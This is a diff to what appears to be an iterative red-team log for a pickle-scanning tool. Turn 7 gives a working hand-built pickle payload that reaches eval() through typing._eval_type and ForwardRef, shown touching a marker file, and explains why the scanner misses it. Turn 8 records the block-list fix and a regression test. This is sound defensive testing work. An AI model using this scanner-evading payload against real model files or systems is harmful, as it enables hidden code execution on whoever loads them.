@@ -160,3 +160,89 @@ Blocking plan:
 
 Performance note: the block adds four sorted binary-search entries and no new
 payload scanning or module-prefix expansion.
+
+## Turn 7 - `typing._eval_type` / `ForwardRef` eval gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("typing"),
+        s("_eval_type"),
+        b"\x93",
+        s("typing"),
+        s("ForwardRef"),
+        b"\x93",
+        s("f(p) or int"),
+        b"\x85R",
+        b"}",
+        s("f"),
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93s",
+        s("p"),
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_typing_eval_type_marker"),
+        b"tRs",
+        s("int"),
+        s("builtins"),
+        s("int"),
+        b"\x93s",
+        b"N\x87R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
+- Unpickle result: creates `/tmp/ma_typing_eval_type_marker` and returns
+  `<class 'int'>`
+- RCE mechanism: `typing._eval_type()` evaluates `ForwardRef` expressions via
+  Python `eval()`. The pickle constructs `typing.ForwardRef("f(p) or int")`
+  during unpickling, supplies attacker-controlled globals where `f` is
+  `pathlib.Path.touch` and `p` is a `Path`, then calls `_eval_type`.
+
+Why the scanner missed it:
+
+- `typing` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals:
+  `typing._eval_type`, `typing.ForwardRef`, `pathlib.Path.touch`,
+  `pathlib.PosixPath`, and `builtins.int`.
+- The evaluated string is intentionally bland (`f(p) or int`) and does not
+  contain existing suspicious string patterns such as `os.system`,
+  `subprocess`, `eval`, `exec`, or `__import__`.
+
+Performance note: this is a policy coverage gap around a direct eval sink. The
+narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
+`("typing", "_eval_type")`, with an oracle regression that manually assembles
+the pickle so no unpickle-time `ForwardRef` code object has to be serialized.
+
+## Turn 8 - Block `typing._eval_type`
+
+Blocking plan:
+
+- Add `("typing", "_eval_type")` to the sorted dangerous-global table.
+- Add portable policy coverage for raw `GLOBAL typing _eval_type` reductions.
+- Add a CPython oracle regression that manually builds the
+  `ForwardRef("f(p) or int")` payload, verifies scanner detection, then verifies
+  marker-file execution during unpickle.
+
+Performance note: the fix is a single additional binary-search entry. It does
+not add expression parsing, string scanning, or special handling for typing
+objects.
